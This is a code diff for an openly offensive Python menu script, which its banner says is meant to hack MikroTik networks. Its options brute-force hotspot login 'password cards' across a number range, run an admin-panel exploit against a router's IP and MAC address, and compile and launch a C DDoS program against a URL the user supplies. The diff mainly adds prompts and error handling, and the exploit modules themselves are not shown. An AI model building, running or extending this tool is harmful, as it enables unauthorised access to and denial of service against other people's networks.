@@ -15,12 +15,13 @@
 import sys
 import os
 import time
+import requests
 
-from tools import asc
+from tools import asc, EX818M
 from color import *
 
 sys.path.append('core/ex818m/')
-from ex818m import MAIN, write
+from ex818m import MAIN, write, cou
 
 sys.path.append('core/ExploitPanelAdmin/')
 from find import MAC
@@ -46,10 +47,11 @@ class LOOP:
         self.find = True
         self.find1 = True
         self.find2 = True
+        self._S_ = EX818M()
 
     def LOOPS(self):
 
-        global ADDR,MACK
+        global ADDR,MACK, s
 
         try:
             while True:
@@ -57,24 +59,39 @@ class LOOP:
                 self._ASC_ = asc()
 
                 if self._ASC_.strip() is "1":
+                    CLEAR()
+
+                    print(self._S_[0])
 
                     url = input(f"{W}[{P} * {W}]{B} Enter the URL Page Login{N}: ")
-
                     minnum = input(f"{W}[{P} * {W}]{B} Enter the Min Number {N}: ")
                     maxnum = input(f"{W}[{P} * {W}]{B} Enter the Max Number {N}: ")
 
+                    if "/login" in url:url = url.replace("/login", "")
+
                     try:
+
                         MAIN.run(True, url, 80, f"{minnum},{maxnum}")
-                    except:
+
+                    except NameError:
+                        print(f"{W}[{R} - {W}]{B} Error For url OR numbers !!!!")
+
                         open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                         f" Error Getting Password Cards Page Login My Network\n{timeS()} Error "
                         f"Url={url} Min Number={minnum} Max Number={maxnum}")
 
+                    except requests.exceptions.ConnectionError:
+
+                        print(f"{W}[{R} - {W}]{B} Error For url !!!!")
+
                 elif self._ASC_.strip() is "2":
+
                     try:
                         ADDR,MACK = MAC().soRun()
+
                     except:
                         self.find = False
+
                         open("./logs/logs.txt", "a").write(f"\n{timeS()}"
                         f" Error Exploit Mikrotik Admin Panel\n{timeS()} Error "
                         f"IP=? MACK=?")
@@ -83,7 +100,8 @@ class LOOP:
 
                     if self.find is True:
                         asc1 = input(f"{W}[{P} * {W}]{B} IP Address Your Router {ADDR} {W}[{P}y{W}/{R}n{W}]{N}:").upper()
-                        if asc1 == "N":self.find1= False
+
+                        if asc1 == "N":self.find1 = False
                         else:":ADDR = ADDR"
 
                     if self.find1 is False:
@@ -94,6 +112,7 @@ class LOOP:
 
                     if self.find is True:
                         asc2 = input(f"{W}[{P} * {W}]{B} MAC Address Your Router {MACK} {W}[{P}y{W}/{R}n{W}]{N}:").upper()
+
                         if asc2 == "N":self.find2 = False
                         else :MACK = MACK
 
@@ -105,20 +124,39 @@ class LOOP:
 
                     try:
                         write(f"\n\n{WOW}Exploiting .................{N}", 10)
+
                         run = RUN.soRun(True, MACK)
+
                         print(run)
 
                     except:
+
                         print(f"{W}[{R} - {W}]{B} Sorry Not Find Exploit For Your Router {N}")
 
                 elif self._ASC_.strip() is "3":
+                    CLEAR()
+
+                    print(self._S_[1])
+
                     url = input(f"{W}[{P} * {W}]{B} Enter the URL For DoDs{N}: ")
+
+                    if "/" in url:
+                        s = url.split("/")
+
+                        R_ = cou(s)
+
+                        if "http:" in s:url = s[2]
+
+                        else:url = s[0]
+
                     write(f"{WOW}WHITE .................{N}", 10)
+
                     url = url.replace("http://", "") \
                         if url.startswith("http://") \
                         else url
 
                     os.system("gcc -s ./core/DDoS/DDoS.c -o ./core/DDoS/DDoS")
+
                     try:
                         " %s " % os.system(f"./core/DDoS/DDoS {url} {80}")
                     except:
@@ -134,6 +172,7 @@ Github      : https://github.com/HathemAhmed
 Version     : v0.1
 info script : this script for Hack Networks Mikrotik """)
                     input(f"{WOW}\n\n------ (Enter) ------{N}")
+
                     CLEAR()
 
                 elif self._ASC_.strip() is "5":
@@ -145,4 +184,7 @@ info script : this script for Hack Networks Mikrotik """)
 
         except KeyboardInterrupt:
             CLEAR()
+
             self.LOOPS()
+
+######################### END #########################
